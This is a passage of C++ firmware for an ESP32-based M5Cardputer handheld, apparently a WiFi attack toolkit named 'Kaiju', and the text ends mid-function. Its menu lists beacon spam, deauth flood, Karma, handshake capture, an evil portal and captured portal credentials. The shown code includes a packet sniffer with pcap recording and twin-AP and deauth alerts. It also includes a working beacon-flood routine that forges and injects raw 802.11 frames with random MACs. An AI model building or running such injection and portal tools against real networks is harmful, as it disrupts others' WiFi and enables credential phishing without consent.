#include <atomic>
#include <cctype>
#include <cstdio>
#include <cstring>
#include <M5Cardputer.h>
#include <SD.h>
#include <DNSServer.h>
#include <SPI.h>
#include <WebServer.h>
#include <WiFi.h>
#include "esp_wifi.h"

namespace {

constexpr uint16_t COLOR_PRIMARY = 0xD5B1;   // 70s tan #D2B48C
constexpr uint16_t COLOR_SECONDARY = 0x9BCA; // brown #9C7A52
constexpr uint16_t COLOR_BG = TFT_BLACK;

const char *const MENU_ITEMS[] = {"WiFi"};
constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
constexpr int WIFI_ITEM = 0;

const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture", "Evil portal", "Portal creds", "Kaijugotchi"};
constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
constexpr int WIFI_TOOL_SCAN = 0;
constexpr int WIFI_TOOL_CHANNELS = 1;
constexpr int WIFI_TOOL_SNIFF = 2;
constexpr int WIFI_TOOL_BEACON = 3;
constexpr int WIFI_TOOL_DEAUTH = 4;
constexpr int WIFI_TOOL_KARMA = 5;
constexpr int WIFI_TOOL_HANDSHAKE = 6;
constexpr int WIFI_TOOL_PORTAL = 7;
constexpr int WIFI_TOOL_CREDS = 8;
constexpr int WIFI_TOOL_AUTO = 9;

constexpr int WIFI_VISIBLE_ROWS = 8;
constexpr int CH_FIRST = 1;
constexpr int CH_LAST = 13;
constexpr uint32_t CH_DWELL_MS = 300;
constexpr int BAR_BASE_Y = 108;
constexpr int BAR_MAX_H = 72;

enum class Screen { Menu, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun, WifiPortalRun, WifiCredsFiles, WifiCredsView, WifiAutoRun };

Screen screen = Screen::Menu;
int selected = 0;
int wifiToolSel = 0;
int wifiToolTop = 0;
constexpr int WIFI_MENU_ROWS = 7;
int netCount = 0;
int netSel = 0;
int netTop = 0;

volatile uint32_t chFrames[CH_LAST + 1] = {};
volatile uint32_t chBeacons[CH_LAST + 1] = {};
uint32_t sweepFrames[CH_LAST + 1] = {};
uint32_t sweepBeacons[CH_LAST + 1] = {};
int chCurrent = CH_FIRST;
int sweepCount = 0;
uint32_t chDwellStart = 0;

void drawSplash() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.setTextSize(3);
    d.drawString("Kaiju", 60, 30);
    d.setTextSize(1);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Cappy's Play", 75, 90);
}

void drawMenu() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("KAIJU", 8, 4);
    d.setTextSize(1);
    for (int i = 0; i < MENU_COUNT; i++) {
        int y = 32 + i * 12;
        if (i == selected) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(MENU_ITEMS[i], 10, y);
    }
}

void drawWifiMenu() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("WiFi", 8, 4);
    d.setTextSize(1);
    for (int row = 0; row < WIFI_MENU_ROWS; row++) {
        int i = wifiToolTop + row;
        if (i >= WIFI_TOOL_COUNT) break;
        int y = 26 + row * 12;
        if (i == wifiToolSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(WIFI_TOOLS[i], 10, y);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Backspace: back", 4, 124);
}

void drawWifiMessage(const char *msg) {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString(msg, 8, 60);
}

void drawWifiScan() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[32];
    snprintf(header, sizeof(header), "WiFi: %d networks", netCount);
    d.drawString(header, 4, 4);

    for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
        int idx = netTop + row;
        if (idx >= netCount) break;
        int y = 18 + row * 12;
        if (idx == netSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        String ssid = WiFi.SSID(idx);
        if (ssid.length() == 0) ssid = "<hidden>";
        char line[48];
        snprintf(line, sizeof(line), "%-16.16s %4ld dBm ch%-2ld", ssid.c_str(), (long)WiFi.RSSI(idx),
                 (long)WiFi.channel(idx));
        d.drawString(line, 4, y);
    }

    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter: rescan  Bksp: back", 4, 124);
}

void scanWifi() {
    drawWifiMessage("Scanning...");
    WiFi.mode(WIFI_STA);
    WiFi.scanDelete();
    int n = WiFi.scanNetworks();
    netCount = n > 0 ? n : 0;
    netSel = 0;
    netTop = 0;
    drawWifiScan();
}

void moveWifiSelection(int delta) {
    int next = netSel + delta;
    if (next < 0 || next >= netCount) return;
    netSel = next;
    if (netSel < netTop) netTop = netSel;
    if (netSel >= netTop + WIFI_VISIBLE_ROWS) netTop = netSel - WIFI_VISIBLE_ROWS + 1;
    drawWifiScan();
}

void onPromiscuous(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    int ch = pkt->rx_ctrl.channel;
    if (ch < CH_FIRST || ch > CH_LAST) return;
    chFrames[ch]++;
    if (type == WIFI_PKT_MGMT && pkt->rx_ctrl.sig_len > 0 && (pkt->payload[0] >> 4) == 0x8) {
        chBeacons[ch]++;
    }
}

void setAnalyzerChannel(int ch) {
    esp_wifi_set_channel(static_cast<uint8_t>(ch), WIFI_SECOND_CHAN_NONE);
}

void drawChannels() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[40];
    snprintf(header, sizeof(header), "Channels  sweep %d  Bksp: back", sweepCount);
    d.drawString(header, 4, 4);

    if (sweepCount == 0) {
        d.drawString("Listening... first sweep in about 4s.", 4, 60);
        return;
    }

    uint32_t maxFrames = 1;
    int busiest = CH_FIRST;
    for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
        if (sweepFrames[ch] > maxFrames) maxFrames = sweepFrames[ch];
        if (sweepFrames[ch] > sweepFrames[busiest]) busiest = ch;
    }

    for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
        int x = 8 + (ch - CH_FIRST) * 17;
        int h = static_cast<int>(sweepFrames[ch] * BAR_MAX_H / maxFrames);
        if (h < 1 && sweepFrames[ch] > 0) h = 1;
        if (h > 0) d.fillRect(x, BAR_BASE_Y - h, 12, h, COLOR_PRIMARY);
        char label[4];
        snprintf(label, sizeof(label), "%d", ch);
        d.setTextColor(COLOR_SECONDARY, COLOR_BG);
        d.drawString(label, x + 2, BAR_BASE_Y + 4);
    }

    char footer[48];
    snprintf(footer, sizeof(footer), "Busiest ch%d: %lu frames, %lu beacons", busiest,
             (unsigned long)sweepFrames[busiest], (unsigned long)sweepBeacons[busiest]);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString(footer, 4, 124);
}

void startChannelAnalyzer() {
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onPromiscuous);
    for (int ch = 0; ch <= CH_LAST; ch++) {
        chFrames[ch] = 0;
        chBeacons[ch] = 0;
        sweepFrames[ch] = 0;
        sweepBeacons[ch] = 0;
    }
    sweepCount = 0;
    chCurrent = CH_FIRST;
    setAnalyzerChannel(chCurrent);
    esp_wifi_set_promiscuous(true);
    chDwellStart = millis();
    drawChannels();
}

void stopChannelAnalyzer() {
    esp_wifi_set_promiscuous(false);
}

void tickChannelAnalyzer() {
    if (millis() - chDwellStart < CH_DWELL_MS) return;
    chDwellStart = millis();
    chCurrent++;
    if (chCurrent > CH_LAST) {
        chCurrent = CH_FIRST;
        for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
            sweepFrames[ch] = chFrames[ch];
            sweepBeacons[ch] = chBeacons[ch];
            chFrames[ch] = 0;
            chBeacons[ch] = 0;
        }
        sweepCount++;
        drawChannels();
    }
    setAnalyzerChannel(chCurrent);
}

enum SniffCounter : uint8_t {
    SNIFF_TOTAL,
    SNIFF_MGMT,
    SNIFF_CTRL,
    SNIFF_DATA,
    SNIFF_BEACON,
    SNIFF_PROBE_REQ,
    SNIFF_PROBE_RESP,
    SNIFF_AUTH,
    SNIFF_DEAUTH,
    SNIFF_DISASSOC,
    SNIFF_COUNT
};

std::atomic<uint32_t> sniffLive[SNIFF_COUNT] = {};
uint32_t sniffShown[SNIFF_COUNT] = {};
bool sniffHop = true;
int sniffCh = CH_FIRST;
uint32_t sniffDwellStart = 0;
uint32_t sniffRateStart = 0;
uint32_t sniffLastTotal = 0;
uint32_t sniffRate = 0;

constexpr int SD_SCK_PIN = 40;
constexpr int SD_MISO_PIN = 39;
constexpr int SD_MOSI_PIN = 14;
constexpr int SD_CS_PIN = 12;
constexpr uint32_t PCAP_SNAPLEN = 256;
constexpr uint32_t PCAP_RING_SIZE = 32768;
constexpr uint32_t PCAP_RECORD_HDR = 16;
constexpr uint32_t PCAP_CHUNK = 512;
constexpr uint32_t PCAP_LINKTYPE_IEEE802_11 = 105;

uint8_t pcapRing[PCAP_RING_SIZE];
std::atomic<uint32_t> pcapHead{0};
std::atomic<uint32_t> pcapTail{0};
std::atomic<uint32_t> pcapDropped{0};
std::atomic<bool> pcapActive{false};
File pcapFile;
bool pcapOpen = false;
bool sdReady = false;
uint32_t pcapBytes = 0;
char pcapName[40] = "";
char pcapMsg[40] = "R: record to SD";

void pcapPutLe32(uint8_t *dst, uint32_t v) {
    dst[0] = v & 0xFF;
    dst[1] = (v >> 8) & 0xFF;
    dst[2] = (v >> 16) & 0xFF;
    dst[3] = (v >> 24) & 0xFF;
}

void pcapRingWrite(uint32_t pos, const uint8_t *src, uint32_t n) {
    for (uint32_t i = 0; i < n; i++) {
        pcapRing[(pos + i) & (PCAP_RING_SIZE - 1)] = src[i];
    }
}

bool pcapEnqueue(const wifi_promiscuous_pkt_t *pkt) {
    uint32_t origLen = pkt->rx_ctrl.sig_len;
    uint32_t capLen = origLen < PCAP_SNAPLEN ? origLen : PCAP_SNAPLEN;
    uint32_t need = PCAP_RECORD_HDR + capLen;
    uint32_t head = pcapHead.load(std::memory_order_relaxed);
    uint32_t tail = pcapTail.load(std::memory_order_acquire);
    if (PCAP_RING_SIZE - (head - tail) < need) {
        pcapDropped.fetch_add(1, std::memory_order_relaxed);
        return false;
    }
    uint32_t us = micros();
    uint8_t hdr[PCAP_RECORD_HDR];
    pcapPutLe32(hdr, us / 1000000);
    pcapPutLe32(hdr + 4, us % 1000000);
    pcapPutLe32(hdr + 8, capLen);
    pcapPutLe32(hdr + 12, origLen);
    pcapRingWrite(head, hdr, PCAP_RECORD_HDR);
    pcapRingWrite(head + PCAP_RECORD_HDR, pkt->payload, capLen);
    pcapHead.store(head + need, std::memory_order_release);
    return true;
}

void pcapFlush(uint32_t budget) {
    if (!pcapOpen) return;
    uint32_t tail = pcapTail.load(std::memory_order_relaxed);
    uint32_t avail = pcapHead.load(std::memory_order_acquire) - tail;
    uint8_t chunk[PCAP_CHUNK];
    while (avail > 0 && budget > 0) {
        uint32_t n = avail < PCAP_CHUNK ? avail : PCAP_CHUNK;
        if (n > budget) n = budget;
        for (uint32_t i = 0; i < n; i++) {
            chunk[i] = pcapRing[(tail + i) & (PCAP_RING_SIZE - 1)];
        }
        pcapFile.write(chunk, n);
        tail += n;
        avail -= n;
        budget -= n;
        pcapBytes += n;
    }
    pcapTail.store(tail, std::memory_order_release);
}

bool ensureSd() {
    if (!sdReady) {
        SPI.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);
        sdReady = SD.begin(SD_CS_PIN, SPI, 25000000);
    }
    return sdReady;
}

void startPcap(const char *prefix) {
    if (!ensureSd()) {
        snprintf(pcapMsg, sizeof(pcapMsg), "no SD card found");
        return;
    }
    if (!SD.exists("/pcap")) SD.mkdir("/pcap");
    snprintf(pcapName, sizeof(pcapName), "%s_%lu.pcap", prefix, (unsigned long)(millis() / 1000));
    char path[64];
    snprintf(path, sizeof(path), "/pcap/%s", pcapName);
    pcapFile = SD.open(path, FILE_WRITE);
    if (!pcapFile) {
        snprintf(pcapMsg, sizeof(pcapMsg), "could not open file");
        return;
    }
    uint8_t globalHdr[24] = {0xD4, 0xC3, 0xB2, 0xA1, 2, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    pcapPutLe32(globalHdr + 16, PCAP_SNAPLEN);
    pcapPutLe32(globalHdr + 20, PCAP_LINKTYPE_IEEE802_11);
    pcapFile.write(globalHdr, sizeof(globalHdr));
    pcapBytes = sizeof(globalHdr);
    pcapTail.store(pcapHead.load(std::memory_order_acquire), std::memory_order_release);
    pcapDropped.store(0, std::memory_order_relaxed);
    pcapOpen = true;
    pcapActive.store(true, std::memory_order_release);
}

void stopPcap() {
    if (!pcapActive.load(std::memory_order_acquire)) return;
    pcapActive.store(false, std::memory_order_release);
    delay(5);
    pcapFlush(0xFFFFFFFFu);
    pcapFile.close();
    pcapOpen = false;
    snprintf(pcapMsg, sizeof(pcapMsg), "saved %lu KB", (unsigned long)(pcapBytes / 1024));
}

void toggleRecording() {
    if (pcapActive.load(std::memory_order_acquire)) {
        stopPcap();
    } else {
        startPcap("kaiju");
    }
}

constexpr size_t BEACON_SSID_MAX = 32;
constexpr int BEACON_SEEN_MAX = 48;
constexpr uint32_t SNIFF_DEAUTH_ALERT = 20;
struct BeaconSeen {
    uint8_t bssid[6];
    char ssid[BEACON_SSID_MAX + 1];
};
BeaconSeen beaconSeen[BEACON_SEEN_MAX];
std::atomic<int> beaconSeenCount{0};
std::atomic<bool> twinAlert{false};
char twinSsid[BEACON_SSID_MAX + 1] = "";
uint32_t sniffDeauthPrev = 0;
uint32_t sniffDeauthHist[10] = {};
int sniffDeauthIdx = 0;
uint32_t sniffDeauthSum = 0;
bool sniffDeauthAlert = false;

void noteBeacon(const wifi_promiscuous_pkt_t *pkt, uint32_t len) {
    if (len < 40) return;
    const uint8_t *bssid = &pkt->payload[16];
    int count = beaconSeenCount.load(std::memory_order_relaxed);
    for (int i = 0; i < count; i++) {
        if (memcmp(beaconSeen[i].bssid, bssid, 6) == 0) return;
    }
    if (count >= BEACON_SEEN_MAX) return;
    uint32_t end = len - 4;
    uint32_t q = 36;
    if (q + 2 > end || pkt->payload[q] != 0) return;
    uint32_t n = pkt->payload[q + 1];
    if (n == 0 || n > BEACON_SSID_MAX || q + 2 + n > end) return;
    char ssid[BEACON_SSID_MAX + 1];
    memcpy(ssid, &pkt->payload[q + 2], n);
    ssid[n] = '\0';
    for (int i = 0; i < count; i++) {
        if (strcmp(beaconSeen[i].ssid, ssid) == 0) {
            snprintf(twinSsid, sizeof(twinSsid), "%s", ssid);
            twinAlert.store(true, std::memory_order_relaxed);
            break;
        }
    }
    memcpy(beaconSeen[count].bssid, bssid, 6);
    snprintf(beaconSeen[count].ssid, sizeof(beaconSeen[count].ssid), "%s", ssid);
    beaconSeenCount.store(count + 1, std::memory_order_release);
}

void onSniff(void *buf, wifi_promiscuous_pkt_type_t type) {
    sniffLive[SNIFF_TOTAL]++;
    if (type != WIFI_PKT_MISC && pcapActive.load(std::memory_order_acquire)) {
        pcapEnqueue(static_cast<wifi_promiscuous_pkt_t *>(buf));
    }
    if (type == WIFI_PKT_CTRL) {
        sniffLive[SNIFF_CTRL]++;
        return;
    }
    if (type == WIFI_PKT_DATA) {
        sniffLive[SNIFF_DATA]++;
        return;
    }
    if (type != WIFI_PKT_MGMT) return;
    sniffLive[SNIFF_MGMT]++;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    if (pkt->rx_ctrl.sig_len < 1) return;
    switch ((pkt->payload[0] >> 4) & 0xF) {
    case 0x4: sniffLive[SNIFF_PROBE_REQ]++; break;
    case 0x5: sniffLive[SNIFF_PROBE_RESP]++; break;
    case 0x8:
        sniffLive[SNIFF_BEACON]++;
        noteBeacon(pkt, pkt->rx_ctrl.sig_len);
        break;
    case 0xA: sniffLive[SNIFF_DISASSOC]++; break;
    case 0xB: sniffLive[SNIFF_AUTH]++; break;
    case 0xC: sniffLive[SNIFF_DEAUTH]++; break;
    default: break;
    }
}

void drawSniffer() {
    for (int i = 0; i < SNIFF_COUNT; i++) sniffShown[i] = sniffLive[i];
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Sniffer  ch%-2d  %s", sniffCh, sniffHop ? "hopping" : "locked");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "Total %lu  (%lu/s)", (unsigned long)sniffShown[SNIFF_TOTAL],
             (unsigned long)sniffRate);
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Mgmt %lu  Ctrl %lu  Data %lu", (unsigned long)sniffShown[SNIFF_MGMT],
             (unsigned long)sniffShown[SNIFF_CTRL], (unsigned long)sniffShown[SNIFF_DATA]);
    d.drawString(line, 4, 30);
    snprintf(line, sizeof(line), "Beacon %lu  ProbeReq %lu", (unsigned long)sniffShown[SNIFF_BEACON],
             (unsigned long)sniffShown[SNIFF_PROBE_REQ]);
    d.drawString(line, 4, 42);
    snprintf(line, sizeof(line), "ProbeResp %lu  Auth %lu", (unsigned long)sniffShown[SNIFF_PROBE_RESP],
             (unsigned long)sniffShown[SNIFF_AUTH]);
    d.drawString(line, 4, 54);
    snprintf(line, sizeof(line), "Deauth %lu  Disassoc %lu", (unsigned long)sniffShown[SNIFF_DEAUTH],
             (unsigned long)sniffShown[SNIFF_DISASSOC]);
    d.drawString(line, 4, 66);
    if (pcapActive.load(std::memory_order_acquire)) {
        snprintf(line, sizeof(line), "REC %s", pcapName);
        d.drawString(line, 4, 80);
        snprintf(line, sizeof(line), "%lu KB  drops %lu", (unsigned long)(pcapBytes / 1024),
                 (unsigned long)pcapDropped.load(std::memory_order_relaxed));
        d.drawString(line, 4, 92);
    } else {
        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        d.drawString(pcapMsg, 4, 80);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    if (twinAlert.load(std::memory_order_relaxed)) {
        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        snprintf(line, sizeof(line), "ALERT twin AP: %.18s", twinSsid);
        d.drawString(line, 4, 104);
    }
    if (sniffDeauthAlert) {
        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        snprintf(line, sizeof(line), "ALERT %lu deauth/disassoc in 10s", (unsigned long)sniffDeauthSum);
        d.drawString(line, 4, 114);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter hop/lock  R rec  Bksp back", 4, 124);
}

void startSniffer() {
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL |
                                        WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onSniff);
    for (int i = 0; i < SNIFF_COUNT; i++) {
        sniffLive[i] = 0;
        sniffShown[i] = 0;
    }
    sniffHop = true;
    sniffCh = CH_FIRST;
    setAnalyzerChannel(sniffCh);
    sniffLastTotal = 0;
    sniffRate = 0;
    sniffDeauthPrev = 0;
    for (auto &v : sniffDeauthHist) v = 0;
    sniffDeauthSum = 0;
    sniffDeauthAlert = false;
    beaconSeenCount.store(0, std::memory_order_relaxed);
    twinAlert.store(false, std::memory_order_relaxed);
    twinSsid[0] = '\0';
    sniffDwellStart = millis();
    sniffRateStart = sniffDwellStart;
    esp_wifi_set_promiscuous(true);
    drawSniffer();
}

void stopSniffer() {
    stopPcap();
    esp_wifi_set_promiscuous(false);
}

void tickSniffer() {
    uint32_t now = millis();
    if (sniffHop && now - sniffDwellStart >= CH_DWELL_MS) {
        sniffDwellStart = now;
        sniffCh = sniffCh >= CH_LAST ? CH_FIRST : sniffCh + 1;
        setAnalyzerChannel(sniffCh);
    }
    if (now - sniffRateStart >= 1000) {
        uint32_t total = sniffLive[SNIFF_TOTAL];
        sniffRate = total - sniffLastTotal;
        sniffLastTotal = total;
        sniffRateStart = now;
        uint32_t attacks = sniffLive[SNIFF_DEAUTH] + sniffLive[SNIFF_DISASSOC];
        sniffDeauthHist[sniffDeauthIdx] = attacks - sniffDeauthPrev;
        sniffDeauthPrev = attacks;
        sniffDeauthIdx = (sniffDeauthIdx + 1) % 10;
        sniffDeauthSum = 0;
        for (uint32_t v : sniffDeauthHist) sniffDeauthSum += v;
        sniffDeauthAlert = sniffDeauthSum >= SNIFF_DEAUTH_ALERT;
        drawSniffer();
    }
}

void moveSnifferChannel(int delta) {
    if (sniffHop) return;
    int next = sniffCh + delta;
    if (next < CH_FIRST) next = CH_LAST;
    if (next > CH_LAST) next = CH_FIRST;
    sniffCh = next;
    setAnalyzerChannel(sniffCh);
    drawSniffer();
}

constexpr int SPAM_MODE_COUNT = 5;
const char *const SPAM_MODE_NAMES[SPAM_MODE_COUNT] = {"Funny names", "Random names", "Single name + counter",
                                                       "Custom list (SD)", "Rick-roll names"};
enum SpamMode : uint8_t { SPAM_FUNNY, SPAM_RANDOM, SPAM_SINGLE, SPAM_CUSTOM, SPAM_ROLL };
constexpr char SPAM_CUSTOM_PATH[] = "/kaiju/ssids.txt";
constexpr int SPAM_CUSTOM_MAX = 64;
constexpr size_t SPAM_SSID_MAX = 32;
constexpr size_t SPAM_BASE_MAX = 26;
constexpr size_t SPAM_FRAME_MAX = 128;
constexpr int SPAM_HOP_MAX_CH = 11;
const char *const SPAM_FUNNY_NAMES[] = {
    "Router? More Like Outer Space", "Pretty Fly for a WiFi", "The LAN Before Time",
    "Bill Wi the Science Fi",        "Get Off My LAN",        "Tell My WiFi Love Her",
    "It Hurts When IP",              "Drop It Like Its Hotspot", "Loading Wi-Fi Please Wait",
    "Free Candy Hotspot"};
constexpr int SPAM_FUNNY_COUNT = sizeof(SPAM_FUNNY_NAMES) / sizeof(SPAM_FUNNY_NAMES[0]);
const char *const SPAM_ROLL_NAMES[] = {
    "Never Gonna Give You WiFi", "Never Gonna Let You Disconnect", "Never Gonna Run Around Your Router",
    "Never Gonna Drop Your Packets", "Never Gonna Make You Log In", "Never Gonna Let Your Signal Down"};
constexpr int SPAM_ROLL_COUNT = sizeof(SPAM_ROLL_NAMES) / sizeof(SPAM_ROLL_NAMES[0]);
constexpr uint8_t SPAM_RATES[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};

int spamModeSel = 0;
SpamMode spamMode = SPAM_FUNNY;
bool spamRunning = false;
bool spamHop = false;
int spamCh = 6;
uint32_t spamSent = 0;
uint32_t spamErrors = 0;
uint32_t spamRounds = 0;
uint32_t spamLastRound = 0;
uint32_t spamLastDraw = 0;
uint32_t spamCounter = 1;
char spamLast[SPAM_SSID_MAX + 1] = "";
char spamBase[SPAM_BASE_MAX + 1] = "";
char spamText[SPAM_BASE_MAX + 1] = "";
int spamTextLen = 0;
char spamCustom[SPAM_CUSTOM_MAX][SPAM_SSID_MAX + 1];
int spamCustomCount = 0;
char spamMsg[48] = "";

void spamRandomMac(uint8_t *mac) {
    mac[0] = static_cast<uint8_t>((random(0, 256) & 0xFC) | 0x02);
    for (int i = 1; i < 6; i++) {
        mac[i] = static_cast<uint8_t>(random(0, 256));
    }
}

void spamRandomName(char *out) {
    static const char CHARSET[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = random(7, 29);
    for (int i = 0; i < len; i++) {
        out[i] = CHARSET[random(0, 52)];
    }
    out[len] = '\0';
}

esp_err_t wifiTx(wifi_interface_t ifx, const uint8_t *frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(ifx, frame, static_cast<int>(len), true);
    for (uint8_t i = 0; err == ESP_ERR_NO_MEM && i < 8; i++) {
        delay(1);
        err = esp_wifi_80211_tx(ifx, frame, static_cast<int>(len), true);
    }
    return err;
}

constexpr uint8_t BCAST_ADDR[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

size_t buildMgmt(uint8_t *f, uint8_t fc0, const uint8_t dst[6], const uint8_t src[6], const char *ssid, uint8_t ch) {
    uint8_t *p = f;
    p[0] = fc0;
    p[1] = 0x00;
    p[2] = 0x00;
    p[3] = 0x00;
    memcpy(p + 4, dst, 6);
    memcpy(p + 10, src, 6);
    memcpy(p + 16, src, 6);
    p[22] = 0x00;
    p[23] = 0x00;
    p += 24;
    memset(p, 0, 8);
    p += 8;
    *p++ = 0x64;
    *p++ = 0x00;
    *p++ = 0x01;
    *p++ = 0x04;
    size_t n = strlen(ssid);
    *p++ = 0x00;
    *p++ = static_cast<uint8_t>(n);
    memcpy(p, ssid, n);
    p += n;
    *p++ = 0x01;
    *p++ = static_cast<uint8_t>(sizeof(SPAM_RATES));
    memcpy(p, SPAM_RATES, sizeof(SPAM_RATES));
    p += sizeof(SPAM_RATES);
    *p++ = 0x03;
    *p++ = 0x01;
    *p++ = ch;
    return static_cast<size_t>(p - f);
}

size_t buildBeacon(uint8_t *f, const char *ssid, const uint8_t mac[6], uint8_t ch) {
    return buildMgmt(f, 0x80, BCAST_ADDR, mac, ssid, ch);
}

esp_err_t spamTx(const uint8_t *frame, size_t len) {
    return wifiTx(WIFI_IF_STA, frame, len);
}

void spamSendName(const char *name) {
    uint8_t mac[6];
    uint8_t frame[SPAM_FRAME_MAX];
    for (int k = 0; k < 2; k++) {
        spamRandomMac(mac);
        size_t len = buildBeacon(frame, name, mac, static_cast<uint8_t>(spamCh));
        if (spamTx(frame, len) == ESP_OK) {
            spamSent++;
        } else {
            spamErrors++;
        }
    }
    snprintf(spamLast, sizeof(spamLast), "%s", name);
    delay(1);
}

void spamRound() {
    spamRounds++;
    if (spamHop) {
        spamCh = spamCh >= SPAM_HOP_MAX_CH ? 1 : spamCh + 1;
        setAnalyzerChannel(spamCh);
    }
    char name[SPAM_SSID_MAX + 1];
    switch (spamMode) {
    case SPAM_FUNNY:
        for (int i = 0; i < SPAM_FUNNY_COUNT; i++) spamSendName(SPAM_FUNNY_NAMES[i]);
        break;
    case SPAM_RANDOM:
        for (int i = 0; i < 4; i++) {
            spamRandomName(name);
            spamSendName(name);
        }
        break;
    case SPAM_SINGLE:
        snprintf(name, sizeof(name), "%s-%lu", spamBase, (unsigned long)spamCounter);
        spamCounter = spamCounter >= 9999 ? 1 : spamCounter + 1;
        spamSendName(name);
        break;
    case SPAM_CUSTOM:
        for (int i = 0; i < spamCustomCount; i++) spamSendName(spamCustom[i]);
        break;
    case SPAM_ROLL:
        for (int i = 0; i < SPAM_ROLL_COUNT; i++) spamSendName(SPAM_ROLL_NAMES[i]);
        break;
    }
}

bool loadSpamCustom() {
    spamCustomCount = 0;
    if (!ensureSd()) {
        snprintf(spamMsg, sizeof(spamMsg), "no SD card found");
        return false;
    }
    File f = SD.open(SPAM_CUSTOM_PATH, FILE_READ);
    if (!f) {
        snprintf(spamMsg, sizeof(spamMsg), "missing %s", SPAM_CUSTOM_PATH);
        return false;
    }
    while (f.available() && spamCustomCount < SPAM_CUSTOM_MAX) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        snprintf(spamCustom[spamCustomCount], SPAM_SSID_MAX + 1, "%s", line.c_str());
        spamCustomCount++;
    }
    f.close();
    if (spamCustomCount == 0) {
        snprintf(spamMsg, sizeof(spamMsg), "file has no names");
        return false;
    }
    snprintf(spamMsg, sizeof(spamMsg), "%d names loaded", spamCustomCount);
    return true;
}

void drawSpamSelect() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("Beacon", 8, 4);
    d.setTextSize(1);
    for (int i = 0; i < SPAM_MODE_COUNT; i++) {
        int y = 30 + i * 12;
        if (i == spamModeSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(SPAM_MODE_NAMES[i], 10, y);
    }
